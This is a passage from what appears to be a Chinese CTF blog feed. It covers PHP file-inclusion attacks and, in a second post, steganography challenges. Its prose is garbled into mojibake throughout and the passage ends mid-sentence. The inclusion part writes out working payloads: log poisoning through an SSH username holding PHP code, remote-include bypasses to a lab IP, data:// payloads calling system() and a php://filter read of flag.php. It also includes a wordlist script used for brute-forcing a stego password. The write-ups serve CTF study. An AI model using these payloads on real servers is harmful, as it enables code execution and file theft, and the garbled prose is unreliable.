é»˜è®¤é…ç½®æ–‡ä»¶ï¼š`/etc/httpd/conf/httpd.conf`æˆ–`/etc/init.d/httpd` `IIS6.0+win2003`` `é…ç½®æ–‡ä»¶ï¼š`C:/Windows/system32/inetsrv/metabase.xml</span><br><span class="line">IIS7.0+WIN `é…ç½®æ–‡ä»¶ï¼š`C:\Windows\System32\inetsrv\config\applicationHost.config</span><br></pre></td></tr></table></figure><h3 id="apache-nginx-æŠ¥é”™æ—¥å¿—"><a href="#apache-nginx-æŠ¥é”™æ—¥å¿—" class="headerlink" title="apache&#x2F;nginx æŠ¥é”™æ—¥å¿—"></a><strong>apache</strong><strong>&#x2F;nginx æŠ¥é”™æ—¥å¿—</strong></h3><p><strong>è®¿é—®æ—¥å¿—</strong></p><p>å¯åˆ©ç”¨æ¡ä»¶ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">éœ€è¦çŸ¥é“æœåŠ¡å™¨æ—¥å¿—çš„å­˜å‚¨è·¯å¾„ï¼Œä¸”æ—¥å¿—æ–‡ä»¶å¯è¯»</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨åŸç†</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">webæœåŠ¡å™¨ä¼šå°†è¯·æ±‚å†™å…¥åˆ°æ—¥å¿—æ–‡ä»¶ä¸­ï¼Œæ¯”å¦‚è¯´apacheã€‚åœ¨ç”¨æˆ·å‘èµ·è¯·æ±‚æ—¶ï¼Œä¼šå°†è¯·æ±‚å†™å…¥access.logï¼Œå½“å‘ç”Ÿé”™è¯¯æ—¶å°†é”™è¯¯å†™å…¥error.log</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨æ–‡ä»¶åŒ…å«æ¼æ´å»åŒ…å«logæ–‡ä»¶</p><p><img src="/img/1721784913663-13.png" alt="img"></p><h3 id="SSH-ç™»å½•æ—¥å¿—"><a href="#SSH-ç™»å½•æ—¥å¿—" class="headerlink" title="SSH ç™»å½•æ—¥å¿—"></a><strong>SSH</strong> <strong>ç™»å½•æ—¥å¿—</strong></h3><p>åˆ©ç”¨æ¡ä»¶ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">éœ€è¦çŸ¥é“ssh-logçš„ä½ç½®ï¼Œä¸”å¯è¯»</span><br></pre></td></tr></table></figure><p>sshæ—¥å¿—é»˜è®¤è·¯å¾„ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/var/log/auth.logï¼ˆé»˜è®¤æƒ…å†µä¸‹ï¼Œæ‰€æœ‰ç”¨æˆ·éƒ½å¯è¯»ï¼‰</span><br><span class="line">/var/log/secure</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨sshå®¢æˆ·ç«¯ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh &#x27;&lt;?php phpinfo();?&gt;&#x27;@IP</span><br></pre></td></tr></table></figure><p><img src="/img/1721784913661-1.png" alt="img"></p><h2 id="ä¸´æ—¶æ–‡ä»¶åŒ…å«"><a href="#ä¸´æ—¶æ–‡ä»¶åŒ…å«" class="headerlink" title="ä¸´æ—¶æ–‡ä»¶åŒ…å«"></a><strong>ä¸´æ—¶æ–‡ä»¶åŒ…å«</strong></h2><p>php ä¸­ä¸Šä¼ æ–‡ä»¶ï¼Œä¼šåˆ›å»ºä¸´æ—¶æ–‡ä»¶ã€‚åœ¨ linux ä¸‹ä½¿ç”¨ &#x2F;tmp ç›®å½•ï¼Œè€Œåœ¨ windows ä¸‹ä½¿ç”¨ <code>c:\winsdows\temp</code> ç›®å½•ã€‚åœ¨ä¸´æ—¶æ–‡ä»¶è¢«åˆ é™¤ä¹‹å‰ï¼Œåˆ©ç”¨ç«äº‰å³å¯åŒ…å«è¯¥ä¸´æ—¶æ–‡ä»¶ã€‚</p><p><strong>æ¼æ´åŸç†</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">åœ¨ç»™PHPå‘é€POSTæ•°æ®åŒ…æ—¶ï¼Œå¦‚æœæ•°æ®åŒ…é‡ŒåŒ…å«æ–‡ä»¶åŒºå—ï¼Œæ— è®ºä½ è®¿é—®çš„ä»£ç ä¸­æœ‰æ²¡æœ‰å¤„ç†æ–‡ä»¶ä¸Šä¼ çš„é€»è¾‘ï¼ŒPHPéƒ½ä¼šå°†è¿™ä¸ªæ–‡ä»¶ä¿å­˜æˆä¸€ä¸ªä¸´æ—¶æ–‡ä»¶ï¼ˆé€šå¸¸æ˜¯/tmp/php[6ä¸ªéšæœºå­—ç¬¦]ï¼‰ï¼Œæ–‡ä»¶åå¯ä»¥åœ¨$_FILESå˜é‡ä¸­æ‰¾åˆ°ã€‚è¿™ä¸ªä¸´æ—¶æ–‡ä»¶ï¼Œåœ¨è¯·æ±‚ç»“æŸåå°±ä¼šè¢«åˆ é™¤ã€‚</span><br><span class="line">åŒæ—¶ï¼Œå› ä¸ºphpinfoé¡µé¢ä¼šå°†å½“å‰è¯·æ±‚ä¸Šä¸‹æ–‡ä¸­æ‰€æœ‰å˜é‡éƒ½æ‰“å°å‡ºæ¥ï¼Œæ‰€ä»¥æˆ‘ä»¬å¦‚æœå‘phpinfoé¡µé¢å‘é€åŒ…å«æ–‡ä»¶åŒºå—çš„æ•°æ®åŒ…ï¼Œåˆ™å³å¯åœ¨è¿”å›åŒ…é‡Œæ‰¾åˆ°$_FILESå˜é‡çš„å†…å®¹ï¼Œè‡ªç„¶ä¹ŸåŒ…å«ä¸´æ—¶æ–‡ä»¶åã€‚</span><br></pre></td></tr></table></figure><p><strong>åˆ©ç”¨åŸç†</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ–‡ä»¶åŒ…å«æ¼æ´å’Œphpinfoé¡µé¢é€šå¸¸æ˜¯ä¸¤ä¸ªé¡µé¢ï¼Œç†è®ºä¸Šæˆ‘ä»¬éœ€è¦å…ˆå‘é€æ•°æ®åŒ…ç»™phpinfoé¡µé¢ï¼Œç„¶åä»è¿”å›é¡µé¢ä¸­åŒ¹é…å‡ºä¸´æ—¶æ–‡ä»¶åï¼Œå†å°†è¿™ä¸ªæ–‡ä»¶åå‘é€ç»™æ–‡ä»¶åŒ…å«æ¼æ´é¡µé¢ï¼Œè¿›è¡Œgetshellï¼Œè¿™é‡Œéœ€è¦åˆ©ç”¨åˆ°æ¡ä»¶ç«äº‰</span><br></pre></td></tr></table></figure><h2 id="è¿œç¨‹æ–‡ä»¶åŒ…å«"><a href="#è¿œç¨‹æ–‡ä»¶åŒ…å«" class="headerlink" title="è¿œç¨‹æ–‡ä»¶åŒ…å«"></a><strong>è¿œç¨‹æ–‡ä»¶åŒ…å«</strong></h2><p>åœ¨PHP 5.2åï¼Œ<code>php.ini</code>é»˜è®¤é…ç½®ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">allow_url_fopen=on</span><br><span class="line">allow_url_include=off</span><br></pre></td></tr></table></figure><blockquote><p>æ­¤æ—¶é™¤éç½‘ç«™ç®¡ç†å‘˜å¼€å¯é…ç½® å¦åˆ™æ— æ³•è¿œç¨‹æ–‡ä»¶åŒ…å«ã€‚åœ¨æŸäº›CTFé¢˜ä¸­å¯èƒ½é‡åˆ°ã€‚åªåšäº†è§£å³å¯</p></blockquote><h3 id="è¿œç¨‹æ–‡ä»¶ç»•è¿‡æŠ€å·§"><a href="#è¿œç¨‹æ–‡ä»¶ç»•è¿‡æŠ€å·§" class="headerlink" title="è¿œç¨‹æ–‡ä»¶ç»•è¿‡æŠ€å·§"></a>è¿œç¨‹æ–‡ä»¶ç»•è¿‡æŠ€å·§</h3><ol><li>é—®å·ç»•è¿‡</li></ol><p>åŒ…å«ç›®æ ‡<code>PHP</code>é¡µé¢</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=http://192.168.91.139/phpinfo.php?</span><br></pre></td></tr></table></figure><ol><li>#å·ç»•è¿‡ï¼š</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=http://192.168.91.139/phpinfo.php#</span><br></pre></td></tr></table></figure><h2 id="å…¶ä»–ç»•è¿‡æ–¹å¼"><a href="#å…¶ä»–ç»•è¿‡æ–¹å¼" class="headerlink" title="å…¶ä»–ç»•è¿‡æ–¹å¼"></a>å…¶ä»–ç»•è¿‡æ–¹å¼</h2><h3 id="urlç¼–ç ç»•è¿‡"><a href="#urlç¼–ç ç»•è¿‡" class="headerlink" title="urlç¼–ç ç»•è¿‡"></a>urlç¼–ç ç»•è¿‡</h3><p>å¦‚æœWAFä¸­æ˜¯å­—ç¬¦ä¸²åŒ¹é…ï¼Œå¯ä»¥ä½¿ç”¨urlå¤šæ¬¡ç¼–ç çš„æ–¹å¼å¯ä»¥ç»•è¿‡</p><h3 id="ç‰¹æ®Šå­—ç¬¦ç»•è¿‡"><a href="#ç‰¹æ®Šå­—ç¬¦ç»•è¿‡" class="headerlink" title="ç‰¹æ®Šå­—ç¬¦ç»•è¿‡"></a>ç‰¹æ®Šå­—ç¬¦ç»•è¿‡</h3><ul><li>æŸäº›æƒ…å†µä¸‹ï¼Œè¯»æ–‡ä»¶æ”¯æŒä½¿ç”¨Shellé€šé…ç¬¦ï¼Œå¦‚ <code>?</code> <code>*</code> ç­‰</li><li>urlä¸­ ä½¿ç”¨ <code>?</code> <code>#</code> å¯èƒ½ä¼šå½±å“includeåŒ…å«çš„ç»“æœ</li><li>æŸäº›æƒ…å†µä¸‹ï¼Œunicodeç¼–ç ä¸åŒä½†æ˜¯å­—å½¢ç›¸è¿‘çš„å­—ç¬¦æœ‰åŒä¸€ä¸ªæ•ˆæœ</li></ul><p>è¿™é‡Œä¹Ÿå°±æ˜¯æŒ‡çš„æ˜¯ä¸Šè¿°çš„è¿œç¨‹æ–‡ä»¶ç»•è¿‡æŠ€å·§</p><h3 id="00æˆªæ–­"><a href="#00æˆªæ–­" class="headerlink" title="%00æˆªæ–­"></a>%00æˆªæ–­</h3><p>å‡ ä¹æ˜¯æœ€å¸¸ç”¨çš„æ–¹æ³•ï¼Œæ¡ä»¶æ˜¯ <code>magic_quotes_gpc</code> å…³é—­ï¼Œè€Œä¸”phpç‰ˆæœ¬å°äº5.3.4ã€‚</p><p>è¿™é‡Œå…ˆäº†è§£ä¸€ä¸‹ï¼Œåé¢åœ¨å‡ºç›¸å…³è®²è§£å’Œä¾‹é¢˜åˆ†æ</p><p>ä»¥ä¸‹ä¾‹é¢˜åªæ¶‰åŠä¸Šè¿°éƒ¨åˆ†çŸ¥è¯†ï¼Œç­‰ä»¥ååšåˆ°ç›¸å…³å…¶ä»–çŸ¥è¯†çš„é¢˜åœ¨è¡¥å……è¿›æ¥</p><h2 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h2><h3 id="Web-php-include"><a href="#Web-php-include" class="headerlink" title="Web_php_include"></a><strong>Web_php_include</strong></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>];</span><br><span class="line"><span class="variable">$page</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line"><span class="keyword">while</span> (<span class="title function_ invoke__">strstr</span>(<span class="variable">$page</span>, <span class="string">&quot;php://&quot;</span>)) &#123;</span><br><span class="line">    <span class="variable">$page</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php://&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$page</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$page</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>strstr()ï¼š</p><p>æœç´¢å­—ç¬¦ä¸²åœ¨å¦ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœæ˜¯ï¼Œè¿”å›å­—ç¬¦ä¸²åŠå‰©ä½™éƒ¨åˆ†ï¼Œå¦åˆ™è¿”å›falseã€‚</p><p>åˆ†æä»£ç å¯çŸ¥ç¨‹åºè¿‡æ»¤æ‰äº†page&#x3D;php:&#x2F;&#x2F;</p><p>å¯ä»¥ä½¿ç”¨dataä¼ªåè®®</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?page=data:<span class="comment">//text/plain,&lt;?php system(&quot;ls&quot;)?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/img/1721784913661-2.png" alt="img"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?page=data:<span class="comment">//text/plain,&lt;?php system(&quot;cat fl4gisisish3r3.php&quot;)?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/img/1721784913661-3.png" alt="img"></p><p><img src="/img/1721784913661-4.png" alt="img"></p><h3 id="æå®¢å¤§æŒ‘æˆ˜-2019-Secret-File"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-Secret-File" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]Secret File"></a><strong>[æå®¢å¤§æŒ‘æˆ˜ 2019]Secret File</strong></h3><p>è€ƒå¯ŸçŸ¥è¯†ç‚¹ï¼š<strong>bp<strong><strong>æŠ“åŒ…</strong></strong>ï¼Œæ–‡ä»¶åŒ…å«-ä¼ªåè®®</strong></p><p>æŸ¥çœ‹é¡µé¢æºä»£ç ï¼Œå‘ç°</p><p><img src="/img/1721784913661-5.png" alt="img"></p><p>è¿›å»çœ‹çœ‹</p><p><img src="/img/1721784913661-6.png" alt="img"></p><p>ä»ç„¶æ²¡å•¥ç”¨ï¼Œå†æ¬¡æŸ¥çœ‹æºä»£ç ï¼Œå‘ç°action.php,è¿›å»çœ‹çœ‹ç›´æ¥åˆ°äº†endé¡µé¢ï¼ŒçŒœæµ‹ååº”å¤ªå¿«ï¼Œè¯•è¯•æŠ“åŒ…</p><p>å‘ç°secr3t.php</p><p><img src="/img/1721784913662-7.png" alt="img"></p><p>ä¹‹åä¸º</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;secret&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strstr</span>(<span class="variable">$file</span>,<span class="string">&quot;../&quot;</span>)||<span class="title function_ invoke__">stristr</span>(<span class="variable">$file</span>, <span class="string">&quot;tp&quot;</span>)||<span class="title function_ invoke__">stristr</span>(<span class="variable">$file</span>,<span class="string">&quot;input&quot;</span>)||<span class="title function_ invoke__">stristr</span>(<span class="variable">$file</span>,<span class="string">&quot;data&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Oh no!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>); </span><br><span class="line"><span class="comment">//flagæ”¾åœ¨äº†flag.phpé‡Œ</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>ä»£ç è§£æ</p><p>å¦‚æœ<code>$file</code>åŒ…å«â€..&#x2F;â€œã€â€tpâ€ã€â€inputâ€æˆ–â€dataâ€ï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰ï¼Œåˆ™è„šæœ¬ä¼šè¾“å‡ºâ€Oh no!â€å¹¶ç»ˆæ­¢æ‰§è¡Œã€‚</p><p>ç¦ç”¨äº†ä¸€éƒ¨åˆ†ä¼ªåè®®çš„å…³é”®è¯ï¼Œé‚£ä¹ˆå°±ç”¨php:&#x2F;&#x2F;filterä¼ªåè®®</p><p>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p><p><img src="/img/1721784913662-8.png" alt="img"></p><p>baseè§£å¯†</p><p>flag{3dbc981c-5d2a-4f52-895b-86ae37448724}</p><h3 id="GDOUCTF-2023-æ³„éœ²çš„ä¼ªè£…"><a href="#GDOUCTF-2023-æ³„éœ²çš„ä¼ªè£…" class="headerlink" title="[GDOUCTF 2023]æ³„éœ²çš„ä¼ªè£…"></a>[GDOUCTF 2023]æ³„éœ²çš„ä¼ªè£…</h3><p>è€ƒç‚¹ï¼š<strong>ç›®å½•æ‰«æï¼Œdataä¼ªåè®®ä½¿ç”¨</strong></p><p><img src="/img/1721784913662-9.png" alt="img"></p><p>ä½ çœ‹ä¸è§æˆ‘ä½†æ˜¯ä½ åˆèƒ½çœ‹è§æˆ‘ï¼Œåº”è¯¥æ˜¯è¢«éšè—äº†ï¼Œç”¨diræ‰«ä¸€ä¸‹ç›®å½•</p><p><img src="/img/1721784913662-10.png" alt="img"></p><p>å‘ç°&#x2F;test.txtå’Œ&#x2F;<a href="http://www.rar/">www.rar</a></p><p>å…ˆè¿›å…¥&#x2F;test.txt</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cxk&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$cxk</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cxk&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$cxk</span>)==<span class="string">&quot;ctrl&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;å¨²æ¥ç¤‚é«â€³æƒ‚&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;nononoononoonono&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä¸‹è½½rarå‘ç°</p><p><img src="/img/1721784913662-11.png" alt="img"></p><p>è¿›å…¥&#x2F;orzorz.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cxk&#x27;</span>]))&#123; </span><br><span class="line">    <span class="variable">$cxk</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cxk&#x27;</span>]; </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$cxk</span>)==<span class="string">&quot;ctrl&quot;</span>)&#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>; </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;æ´—æ´—ç¡å§&quot;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;nononoononoonono&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span>nononoononoonono</span><br></pre></td></tr></table></figure><p>å’Œtest.txtç›¸ä¼¼</p><p>ä»£ç åˆ†æï¼šæ£€æŸ¥æ˜¯å¦å­˜åœ¨åä¸º â€˜cxkâ€™ çš„ GET å‚æ•°ï¼Œèµ‹å€¼ç»™$cxk</p><p>ä½¿ç”¨ file_get_contents($cxk) å‡½æ•°è¯»å– $cxk å˜é‡ä¸­æŒ‡å®šçš„ URL æˆ–æ–‡ä»¶çš„å†…å®¹</p><p>å¦‚æœè¯»å–çš„å†…å®¹ç­‰äºå­—ç¬¦ä¸² â€œctrlâ€ï¼Œåˆ™è¾“å‡ºå˜é‡ $flag çš„å€¼</p><p>file_get_content()å‡½æ•°é…åˆphpä¼ªåè®®æ¥è·å–flag</p><p>è¿™é‡Œé‡‡ç”¨dataåè®®ï¼Œæ„é€ payloadä¸º</p><p>?cxk&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,ctrl</p><p>?cxk&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,Y3RybA&#x3D;&#x3D;</p><p><img src="/img/1721784913662-12.png" alt="img"></p><p>NSSCTF{a1475d2b-f68b-4eb0-aa97-3d998ac90e1a}</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>éšå†™</title>
      <link href="/2024/07/23/%E9%9A%90%E5%86%99/"/>
      <url>/2024/07/23/%E9%9A%90%E5%86%99/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h2 id="jpgç±»éšå†™"><a href="#jpgç±»éšå†™" class="headerlink" title="jpgç±»éšå†™"></a>jpgç±»éšå†™</h2><h3 id="jphideéšå†™"><a href="#jphideéšå†™" class="headerlink" title="jphideéšå†™"></a>jphideéšå†™</h3><p>010é‡Œå‘ç°å‡çš„flag</p><p><img src="/img/1721699493768-127.png" alt="img"></p><p>5a+G56CBMTIz</p><p><img src="/img/1721699493768-128.png" alt="img"></p><p>å¯†ç 123ï¼Œæœ‰å¯†ç çš„jpgéšå†™ï¼Œsteghide,JPHS.</p><p>ç”¨stegdetectæ£€æŸ¥ä¸€ä¸‹ï¼Œå‘ç°æ˜¯jphideéšå†™</p><p><img src="/img/1721699493768-129.png" alt="img"></p><p>JPHS</p><p><img src="/img/1721699493768-130.png" alt="img"></p><p>FSCTF{huang_duduanwangu}</p><h3 id="outgusséšå†™"><a href="#outgusséšå†™" class="headerlink" title="outgusséšå†™"></a>outgusséšå†™</h3><p><img src="/img/1721699493768-131.jpeg" alt="img"></p><p>æŸ¥çœ‹å±æ€§ï¼š<strong>å…¬æ­£æ°‘ä¸»å…¬æ­£æ–‡æ˜å…¬æ­£å’Œè°</strong></p><p>ç¤¾ä¼šä¸»ä¹‰æ ¸å¿ƒä»·å€¼è§‚è§£å¯†</p><p>å¯†ç ä¸ºabc</p><p>é‡‡ç”¨outguessè§£å¯†</p><p>outguesså®‰è£…ï¼š<a href="https://blog.csdn.net/m0_58199719/article/details/123692511?spm=1001.2014.3001.5501">https://blog.csdn.net/m0_58199719/article/details/123692511?spm=1001.2014.3001.5501</a></p><p><img src="/img/1721699493768-132.png" alt="img"></p><p>outguessä½¿ç”¨</p><p>æ³¨æ„ï¼š<strong>outguess -k â€˜å¯†ç â€™ -r æ–‡ä»¶å flag.txt</strong></p><p>ACTF{gue33_Gu3Ss!2020}</p><h3 id="F5-steganographyéšå†™"><a href="#F5-steganographyéšå†™" class="headerlink" title="F5-steganographyéšå†™"></a>F5-steganographyéšå†™</h3><p>åˆ·æ–°è¿‡çš„å›¾ç‰‡</p><p><img src="/img/1721699493768-133.jpeg" alt="img"></p><p>010é‡Œé¢æ²¡æœ‰æœ‰æ•ˆä¿¡æ¯ï¼Œbinwalkæ— ç»“æœï¼Œè¿™é¢˜æ¶‰åŠF5-steganographyéšå†™</p><p>å·¥å…·å®‰è£…å‚è€ƒåšå®¢   <a href="https://blog.csdn.net/weixin_30627381/article/details/99264894">https://blog.csdn.net/weixin_30627381/article/details/99264894</a></p><p><img src="/img/1721699493768-134.png" alt="img"></p><p>è¿›å…¥F5-steganography-masteræ–‡ä»¶å¤¹ï¼Œåœ¨ç©ºç™½å¤„ ctrl+shift+é¼ æ ‡å³é”®-&gt;åœ¨æ­¤å¤„æ‰“å¼€å‘½ä»¤çª—å£</p><p>åœ¨cmdä¸­è¾“å…¥å‘½ä»¤ï¼š</p><p>java Extract æ–‡ä»¶çš„ç»å¯¹è·¯å¾„ -p å¯†ç </p><p><strong>æ³¨æ„ï¼šå°†å›¾ç‰‡æ”¾å…¥F5-steganography-masterç›®å½•ä¸­ï¼Œä¼šç”Ÿæˆä¸€ä¸ªoutput.txt</strong></p><p><img src="/img/1721699493768-135.png" alt="img"></p><p>å¼€å¤´ä¸ºPK,å°†txtæ”¹ä¸ºzipå³å¯å‡ºç°flag</p><p>flag{96efd0a2037d06f34199e921079778ee}</p><h3 id="steghideéšå†™"><a href="#steghideéšå†™" class="headerlink" title="steghideéšå†™"></a>steghideéšå†™</h3><p>æ ¹æ®é¢˜ç›®æç¤ºåŸç¥ä¸ƒä¸ƒåœ¨å“ªé‡Œ</p><p><img src="/img/1721699493768-136.png" alt="img"></p><p>å¯†ç ä¸ºliyue</p><p>kalié‡Œç”¨steghideé‡ŒæŸ¥çœ‹</p><p>å‘½ä»¤æ˜¯steghide extract -sf æ–‡ä»¶å -p å¯†ç </p><p><img src="/img/1721699493768-137.png" alt="img"></p><p><img src="/img/1721699493768-138.png" alt="img"></p><p>å‘ç°é›¶å®½å­—ç¬¦éšå†™</p><p><img src="/img/1721699493768-139.png" alt="img"></p><p>è¿™æ˜¯ä¸€ä¸ªé”™è¯¯çš„flagï¼Œä½†æ˜¯å¯èƒ½æ˜¯å­—æ¯çš„å¤§å°ä¸ä¸€æ ·ï¼Œç¼–å†™è„šæœ¬ï¼Œå¾—å‡ºæ‰€æœ‰å¤§å°å†™çš„å¯èƒ½æ€§ï¼Œå¹¶ç”Ÿæˆdic.txt.</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_character_combinations</span>(<span class="params">word</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;è·å–å•è¯ä¸­æ¯ä¸ªå­—ç¬¦çš„å¤§å°å†™ç»„åˆå¯èƒ½æ€§&quot;&quot;&quot;</span></span><br><span class="line">    character_combinations = &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> word:</span><br><span class="line">        combinations = <span class="built_in">list</span>(<span class="built_in">set</span>([<span class="string">&quot;&quot;</span>.join(comb) <span class="keyword">for</span> comb <span class="keyword">in</span> itertools.product(*<span class="built_in">zip</span>(char.lower(), char.upper()))]))</span><br><span class="line">        character_combinations[char] = combinations</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> character_combinations</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_variants</span>(<span class="params">word, character_combinations</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;ç”Ÿæˆå˜å½¢å­—ç¬¦ä¸²&quot;&quot;&quot;</span></span><br><span class="line">    variants = <span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> combination <span class="keyword">in</span> itertools.product(*[character_combinations[char] <span class="keyword">for</span> char <span class="keyword">in</span> word]):</span><br><span class="line">        variant = <span class="string">&quot;&quot;</span>.join(combination)</span><br><span class="line">        <span class="keyword">if</span> variant != word:</span><br><span class="line">            variants.add(variant)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> variants</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">save_to_file</span>(<span class="params">variants, filename</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;å°†å˜å½¢å­—ç¬¦ä¸²ä¿å­˜åˆ°æ–‡ä»¶ä¸­&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        <span class="keyword">for</span> variant <span class="keyword">in</span> variants:</span><br><span class="line">            file.write(<span class="string">f&quot;flag&#123;&#123;<span class="subst">&#123;variant&#125;</span>&#125;&#125;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å•è¯ JPeG_Is_IntErEsting</span></span><br><span class="line">word = <span class="string">&quot;JPeG_Is_IntErEsting&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å–å­—ç¬¦å¤§å°å†™ç»„åˆå¯èƒ½æ€§</span></span><br><span class="line">character_combinations = get_character_combinations(word)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç”Ÿæˆå˜å½¢å­—ç¬¦ä¸²</span></span><br><span class="line">variants = generate_variants(word, character_combinations)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¿å­˜åˆ°æ–‡ä»¶</span></span><br><span class="line">save_to_file(variants, <span class="string">&quot;dic.txt&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;ä¿å­˜æˆåŠŸï¼&quot;</span>)</span><br></pre></td></tr></table></figure><p>è¿›è¡Œå­—å…¸çˆ†ç ´</p><p><img src="/img/1721699493768-140.png" alt="img"></p><p>å¾—åˆ°å¯†ç 